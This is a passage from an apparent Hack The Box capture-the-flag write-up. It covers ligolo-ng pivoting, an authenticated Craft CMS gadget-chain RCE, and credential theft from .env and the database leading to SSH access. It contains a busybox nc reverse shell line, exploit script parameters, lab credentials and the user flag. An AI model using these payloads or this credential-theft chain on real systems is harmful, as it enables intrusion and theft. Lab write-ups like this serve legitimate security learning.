### 6.2 Acquire and stage the ligolo-ng binaries:

**Why this step:** Kali has no route to `10.13.37.0/24`; the portal is only reachable from the pivot. ligolo-ng builds an L3 tunnel so Kali's own tools and browser reach the internal net directly. It needs a `proxy` on Kali and an `agent` on the pivot.

**Command:**

```bash
# On Kali:
mkdir -p ~/ligolo && cd ~/ligolo
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
tar xf ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
tar xf ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
ls -l proxy agent
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`wget .../ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz`|The controller binary, run on Kali (x86-64). Note the version tag is `v0.9.2`, not `v0.92`; the wrong tag returns 404.|
|`wget .../ligolo-ng_agent_0.9.2_linux_amd64.tar.gz`|The relay binary; `linux_amd64` matches the Ubuntu x86-64 target.|
|`tar xf ...`|Extract each archive, yielding the `proxy` and `agent` executables.|

**Result:**

```
-rwxr-xr-x 1 nedmoeca nedmoeca  7164088 Sep 26 04:04 agent
-rwxr-xr-x 1 nedmoeca nedmoeca 21242040 Sep 26 04:07 proxy
```

**What this gives you:** Key finding: both ligolo-ng binaries staged on Kali, ready to deploy.

**Next:** Start the proxy on Kali and create the TUN interface it will route through.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6.3 Start the ligolo proxy (as root) and create the TUN interface:

**Why this step:** The proxy manages a virtual TUN interface and kernel routes, which requires `CAP_NET_ADMIN`. Running it as root is necessary; an unprivileged proxy cannot add the route and fails with "operation not permitted."

**Command:**

```bash
# On Kali:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
cd ~/ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip tuntap add user $(whoami) mode tun ligolo`|Create a virtual TUN interface named `ligolo`; traffic routed to it is handed to the proxy process.|
|`ip link set ligolo up`|Bring the interface up so routes can point at it.|
|`sudo ./proxy`|Run the controller as root so it can create/destroy the interface and install routes.|
|`-selfcert`|Auto-generate a self-signed TLS certificate for the agent-to-proxy tunnel.|
|`-laddr 0.0.0.0:11601`|Listen on all interfaces, port 11601, for the agent's reverse connection.|

**Result:**

```
INFO[0000] Listening on 0.0.0.0:11601
         __    _             __
        / /   (_)___ _____  / /___        ____  ____ _
       Version: 0.9.2
ligolo-ng »
```

**What this gives you:**

Key findings:

- Proxy running as root and listening on 11601, at an interactive `ligolo-ng »` console.
- Running it unprivileged earlier produced `Could not add route ... operation not permitted` and a non-functional tunnel; root resolves this.

**Next:** Transfer the agent to the pivot and connect it back to this proxy.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6.4 Deploy and connect the agent from the pivot:

**Why this step:** The agent must run on airside-ws01 and connect outbound to the proxy on Kali. The outbound control connection rides eth0/VPN, which is allowed; only the data routes are kept off eth0.

**Command:**

```bash
# On Kali (separate terminal): serve the agent
cd ~/ligolo && python3 -m http.server 8000

# On airside-ws01 (reverse shell):
cd /tmp
wget http://KALI_TUN0_IP:8000/agent -O agent
chmod +x agent
./agent -connect KALI_TUN0_IP:11601 -ignore-cert
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`python3 -m http.server 8000`|Temporary web server on Kali to deliver the agent binary.|
|`wget .../agent -O agent`|Fetch the binary onto the pivot.|
|`./agent -connect KALI_TUN0_IP:11601`|Connect the agent outbound to the proxy over Kali's tun0.|
|`-ignore-cert`|Accept the proxy's self-signed certificate.|

**Result:**

```
# pivot:
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established       addr="KALI_TUN0_IP:11601"

# proxy console:
INFO Agent joined.   id=020000000200 name=root@airside-ws01 remote="TARGET_IP:34454"
```

**What this gives you:** Key finding: agent connected; session `root@airside-ws01` available in the proxy. The agent auto-reconnects if the proxy restarts.

**Next:** Select the session and autoroute the internal subnet.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6.5 Autoroute the internal subnet and start the tunnel:

**Why this step:** The agent is connected but no traffic flows until Kali has a route for the internal net pointing at the tunnel. Select only the internal `/24`; routing the external/VPN subnet back through the tunnel would loop the connection and drop it.

**Command (ligolo-ng proxy console):**

```
session
1
autoroute
# select ONLY 10.13.37.0/24 (space), then:
#   Use an existing one -> ligolo -> Start the tunnel? Yes
```

Pre-step on Kali if the VPN pushed a competing route:

```bash
sudo ip route del 10.13.37.0/24     # remove the "via 10.10.14.1 dev tun0" route first
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`session` / `1`|Select the active agent session.|
|`autoroute`|Read the agent's interfaces and offer their subnets as routes to install on Kali.|
|select `10.13.37.0/24` only|Route just the internal net through the tunnel.|
|leave `10.159.x.x` unselected|That is eth0/VPN; routing it through the tunnel creates a loop that kills the session.|
|`ip route del 10.13.37.0/24`|The HTB VPN pushes `10.13.37.0/24 via 10.10.14.1 dev tun0`; delete it so the ligolo route wins.|

**Result:**

```
INFO Creating routes for ligolo...
? Start the tunnel? Yes
INFO Starting tunnel to root@airside-ws01 (020000000200)
```

**What this gives you:**

Key findings:

- Tunnel started with the internal `/24` routed through the `ligolo` interface.
- The route-add succeeded only with the proxy running as root (the unprivileged attempt failed), and only after deleting the VPN-pushed `10.13.37.0/24` route.

**Next:** Verify the route and prove reachability to the portal from Kali.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6.6 Verify reachability and add the hostname:

**Why this step:** Confirm the tunnel actually carries traffic before relying on it, and map the portal hostname so Craft's login and the exploit can address it by name.

**Command:**

```bash
ip route | grep 10.13.37
ping -c 2 10.13.37.10
curl -s -I http://10.13.37.10/
echo "10.13.37.10  portal.international.htb wifi.international.htb" | sudo tee -a /etc/hosts
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip route \| grep 10.13.37`|Confirm the route points at `dev ligolo`, not `via ... dev tun0`.|
|`ping -c 2 10.13.37.10`|ICMP rides ligolo's L3 tunnel (a SOCKS proxy could not carry this), proving the pivot works.|
|`curl -s -I http://10.13.37.10/`|Confirm the internal web server answers from Kali.|
|`echo ... \| sudo tee -a /etc/hosts`|Resolve `portal.international.htb` to the internal IP locally (no internal DNS over the tunnel).|

**Result:**

```
10.13.37.0/24 dev ligolo

64 bytes from 10.13.37.10: icmp_seq=1 ttl=64 time=351 ms
64 bytes from 10.13.37.10: icmp_seq=2 ttl=64 time=241 ms

HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Content-Length: 14221
```

**What this gives you:**

Key findings:

- Route confirmed `dev ligolo`; Kali reaches `10.13.37.10` by ICMP and HTTP through the tunnel (ttl 64, HTTP 200 from nginx).
- Added latency (~295 ms vs 0.3 ms from the pivot directly) reflects the extra Kali-to-pivot round trip and is expected.
- `portal.international.htb` now resolves locally on Kali to the internal portal.

**Next:** From Kali, browse the Craft CMS admin login and authenticate as jenny using the sniffed credentials, then identify the exact Craft version to confirm the RCE applies.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Web Exploitation: Craft CMS Authenticated RCE

### 7.1 Authenticate to the Craft control panel and confirm the version:

**Why this step:** With the tunnel up (Section 6) and sniffed credentials in hand (5.2), log into the Craft CP from Kali and read the exact version. The condition-config RCE requires both a CP-capable account and a vulnerable version (`< 5.10.6`).

**Action:**

```
# From the Kali browser:
http://portal.international.htb/admin/login
# Credentials: jenny / Fl1ghtDeck2026!
# After login, read the version from the CP footer (or Utilities -> System Report).
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`/admin/login`|Craft's control-panel login endpoint (distinct from the public Miles portal).|
|`jenny / Fl1ghtDeck2026!`|Credentials captured via wireless sniffing (5.2); reused here because jenny has CP access.|
|CP footer version string|Authoritative in-app version, used because the unauthenticated curl greps returned nothing.|

**Result:**

```
Logged in as jenny -> /admin/dashboard (CP access confirmed)
Footer: Craft CMS  SOLO  5.9.8
Dashboard notice: "One update available" / "Craft 5.10 Released"
```

![[layover_craft_dashboard_version.png]]

**What this gives you:**

Key findings:

- jenny has Craft control-panel access (reached `/admin/dashboard`), satisfying the "authenticated" requirement of the RCE.
- Craft version is **5.9.8**, which is below the fixed **5.10.6**, so the condition-config authenticated RCE applies. The in-app "update available / Craft 5.10 released" notice independently confirms the install is pre-patch.

###### How the Craft condition-config RCE works (theory):

Craft lets CP users define "element conditions" (rules that filter elements like entries or categories) as JSON, which Craft deserializes into live PHP objects via Yii's `Yii::createObject()`. The Yii framework supports attaching Behaviors to an object through an `as <name>` key and binding event handlers through an `on <event>` key. Because Craft does not sufficiently restrict the classes and keys in this user-supplied JSON, an authenticated attacker can attach a legitimate-but-abusable behavior (`yii\behaviors\AttributeTypecastBehavior`) whose "typecast" callable is pointed at a command-execution sink, and trigger it with a wildcard `on *` event handler. When Craft evaluates the condition, the event fires, the behavior runs the callable, and the attacker's command executes as the web user. This is a PHP object-injection gadget chain: the individual classes are benign, but chained through configuration they yield remote code execution.

**Next:** Prepare the exploit. Because the portal runs on the internal segment and cannot route to Kali, the reverse shell from www-data must call back to the pivot's wlan2 address (`10.13.37.183`), where a listener will be waiting, rather than to Kali.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.2 Trigger the RCE and catch a shell as www-data:

**Why this step:** jenny has CP access on vulnerable Craft 5.9.8 (7.1). Submit the Yii behavior gadget through the element-condition sink to execute a reverse-shell command as the web user. The callback targets the pivot (`10.13.37.183`), since the portal cannot route to Kali.

**Command:**

```bash
# On the pivot (airside-ws01): listener bound to its wlan2 address
nc -lvnp 4444

# On Kali: run the exploit over the ligolo tunnel
python3 craft_rce.py
```

Exploit script (`craft_rce.py`, key parameters):

```python
BASE  = "http://portal.international.htb"
USER  = "jenny"
PASS  = "Fl1ghtDeck2026!"
LHOST = "10.13.37.183"     # pivot wlan2 IP — listener lives here, NOT Kali
LPORT = 4444
# login -> fresh CP CSRF -> POST crafted condition to
#   /index.php?p=admin/actions/element-search/search
# gadget: "as rce" => yii\behaviors\AttributeTypecastBehavior
#         typecast sink => Psy\Readline\Hoa\ConsoleProcessus::execute(cmd)
#         "on *" => self::beforeSave  (fires on any event)
# tries shells in order: busybox nc / ncat / nc / python3
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nc -lvnp 4444` on the pivot|Catches the reverse shell at `10.13.37.183:4444`, the only listener address the portal can reach.|
|login + fresh CP CSRF|Craft actions require a valid CSRF token; the script logs in as jenny and reads a current token from the CP.|
|`"as rce": AttributeTypecastBehavior`|Attaches the abusable Yii behavior to the condition's field layout.|
|typecast => `ConsoleProcessus::execute`|Points the behavior's typecast callable at a command-execution sink bundled with Craft's dependencies.|
|`"on *": self::beforeSave`|Wildcard event handler so the behavior fires as soon as Craft evaluates the condition.|
|POST to `element-search/search`|The reachable admin action that deserializes the attacker-controlled condition JSON.|
|shell list (busybox/ncat/nc/python3)|Tries multiple one-liners; the first that connects hangs the HTTP request (a timeout = success).|

**Result:**

```
# Kali:
[+] logged in as jenny
[+] timeout (shell probably running): busybox nc 10.13.37.183 4444 -e /bin/sh
[*] check your listener on the pivot host

# Pivot listener:
Connection received on 10.13.37.10 54246
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
portal
```

**What this gives you:**

Key findings:

- Remote code execution achieved as `www-data` on host `portal` (`10.13.37.10`), the internal Craft server.
- The reverse shell correctly returned to the pivot (`10.13.37.183`), confirming the internal-callback requirement; the `busybox nc -e` payload succeeded first.
- A request timeout on the Kali side is the expected success indicator (the PHP worker blocks while running the shell).

**Next:** From the www-data shell, read Craft's `.env` for the security key and database credentials, then locate where the custom Miles module stores the encrypted mail-relay password.
<div align="center">
<br>
<br>
</div>
###### Stabilize the www-data shell:

**Why this step:** The caught shell is a raw `busybox nc -e /bin/sh` with no PTY, so `su`, job control, and line editing misbehave. Upgrade it to a proper bash PTY before post-exploitation enumeration on the portal.

**Command:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || script -qc /bin/bash /dev/null
export TERM=xterm
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Allocate a pseudo-terminal and run bash in it, giving the shell a controlling TTY.|
|`2>/dev/null \| script -qc /bin/bash /dev/null`|If python3 is absent on the target, fall back to `script`, which also allocates a PTY, discarding its typescript to `/dev/null`.|
|`export TERM=xterm`|Set the terminal type so screen-drawing programs render correctly.|

**Result:**

```
www-data@portal:~/portal/web$
```

(Prompt now shows a proper `www-data@portal` bash prompt; the python3 path succeeded.)

**What this gives you:** Key finding: a usable interactive bash shell as www-data on the portal, suitable for database queries and the decrypt step.

**Next:** Move to Craft's web root and confirm the layout (`.env`, `modules/`, `craft` CLI) before reading secrets.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.3 Read Craft's environment secrets

**Why this step:** With code execution as www-data (7.2), the next move is to recover credentials for a real user. Craft stores its master encryption key and database credentials in `.env`; both are needed to decrypt secrets held in the database.

**Command:**

```bash
cat /var/www/portal/.env
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`cat /var/www/portal/.env`|Read Craft's environment file, which holds configuration and secrets injected at runtime (the Twelve-Factor pattern).|

**Result (secret values scrubbed):**

```
CRAFT_ENVIRONMENT=production
CRAFT_SECURITY_KEY=<REDACTED_SECURITY_KEY>
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_ENABLE_TWIG_SANDBOX=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=<REDACTED_DB_PASSWORD>
```

**What this gives you:**

Key findings:

- `CRAFT_SECURITY_KEY` recovered: the master key Craft/Yii uses to encrypt and decrypt stored data. Required to decrypt the mail-relay password blob.
- Database credentials recovered: `craftuser` on local MySQL (`127.0.0.1:3306`), database `craft`. These give read access to Craft's tables.
- Hardening flags `CRAFT_ALLOW_ADMIN_CHANGES=false` and `CRAFT_ENABLE_TWIG_SANDBOX=true` are set, which rules out admin-settings tampering and Twig template injection as alternate paths and confirms the database-decryption route.

**Next:** Locate the custom Miles module's settings table in the database and pull the encrypted mail-relay credentials, then decrypt the password using Craft's own security component.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.4 Pull the encrypted mail-relay credentials from the database

**Why this step:** With DB credentials from `.env` (7.3), query the custom Miles module's settings table. The module stores a service account's credentials, and service-account passwords are a common reuse vector onto a real system user.

**Command:**

```bash
mysql -u craftuser -p'<DB_PASS>' craft -e "show tables like '%htbairways%';"
mysql -u craftuser -p'<DB_PASS>' craft -e "select name,value from htbairways_settings;"
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`mysql -u craftuser -p'<DB_PASS>' craft`|Connect to the `craft` database as the user recovered from `.env`.|
|`show tables like '%htbairways%'`|Confirm the custom module's settings table name rather than assuming it.|
|`-e "select name,value from htbairways_settings;"`|Dump the module's stored settings, including the mail-relay account.|

**Result (password blob scrubbed):**

```
+--------------------------------+
| Tables_in_craft (%htbairways%) |
+--------------------------------+
| htbairways_settings            |
+--------------------------------+

+-------------------+-----------------------------------------------------+
| name              | value                                               |
+-------------------+-----------------------------------------------------+
| mailRelayPassword | <REDACTED_BASE64_ENCRYPTED_BLOB>                    |
| mailRelayHost     | mail.htbairways.htb                                 |
| mailRelayPort     | 587                                                 |
| mailRelayUser     | aporter                                             |
+-------------------+-----------------------------------------------------+
```

**What this gives you:**

Key findings:

- Mail-relay username is **`aporter`**, a candidate real-system user.
- `mailRelayPassword` is a base64-encoded, Craft-encrypted blob, not plaintext; it must be decrypted with the security key from `.env`.
- `mailRelayHost` / `mailRelayPort` (`mail.htbairways.htb:587`) are SMTP settings, not directly useful for access.

**Next:** Decrypt the blob using Craft's own security component (seeded with the `.env` security key) via the bundled `craft` CLI, avoiding any manual AES/HMAC reconstruction.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.5 Decrypt the mail-relay password with Craft's own crypto

**Why this step:** The `mailRelayPassword` from the database (7.4) is Craft-encrypted. Rather than reimplement Yii's AES-256-CBC + HMAC + PBKDF2 scheme, use the running Craft application (which already holds the security key from `.env`) to decrypt its own data.

**Command:**

```bash
cd /var/www/portal
php craft exec "echo Craft::\$app->security->decryptByKey(base64_decode('<BASE64_BLOB>')), PHP_EOL;"
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`php craft exec "<php>"`|Run arbitrary PHP inside the fully bootstrapped Craft app, so the Yii container, config, and `.env` security key are all loaded.|
|`Craft::\$app->security->decryptByKey(...)`|Craft's native decrypt method; handles HMAC verification, IV extraction, and AES decryption internally. `\$` is escaped so bash does not expand it.|
|`base64_decode('<BASE64_BLOB>')`|The stored value is base64; decode to the raw ciphertext bytes the method expects.|
|`PHP_EOL`|Append a newline for clean output.|

**Result (plaintext scrubbed):**

```
Output:
<REDACTED_RELAY_PASSWORD>
```

**What this gives you:**

Key findings:

- The mail-relay password decrypts to a plaintext string (the SMTP password for `aporter`).
- Because service-account passwords are frequently reused, this is the candidate login password for the system user `aporter`.

**Next:** Authenticate as `aporter` over SSH from Kali (port 22 was open externally) using the decrypted password, and read the user flag.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.6 Authenticate as aporter over SSH

**Why this step:** The decrypted mail-relay password (7.5) is a reuse candidate for the system user `aporter`. SSH in to convert www-data code execution into a stable, legitimate user session and reach the user flag. The portal (`10.13.37.10`) is internal, so SSH routes through the ligolo tunnel, not the external IP.

**Command:**

```bash
ssh aporter@10.13.37.10
# password: <decrypted relay password from 7.5>
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ssh aporter@10.13.37.10`|Connect to the internal portal's SSH service through the ligolo tunnel. The external target IP is the workstation (airside-ws01), where aporter has no account; aporter is a local user on the portal, so the internal address is required.|
|password reuse|The mail-relay password doubles as aporter's system login, confirming the service-account reuse hypothesis.|

**Result:**

```
aporter@10.13.37.10's password:
aporter@portal:~$ id
uid=1001(aporter) gid=1001(aporter) groups=1001(aporter)
aporter@portal:~$ hostname
portal
```

**What this gives you:**

Key findings:

- Interactive SSH session as `aporter` on host `portal`, a stable foothold replacing the www-data reverse shell.
- Password reuse confirmed: the decrypted mail-relay password authenticates aporter over SSH.
- Attempting this against the external IP fails (aporter is not a user on the workstation); the login succeeds only against the internal portal via the tunnel.

**Next:** Read the user flag, then enumerate the portal for a privilege-escalation path to root.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.7 Capture the user flag

**Command:**

```bash
cat ~/user.txt
```

**Result:**

```
ef28e95e04d9d56ea2a56c437107e43a
```

==USER FLAG:== `ef28e95e04d9d56ea2a56c437107e43a`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>


## References

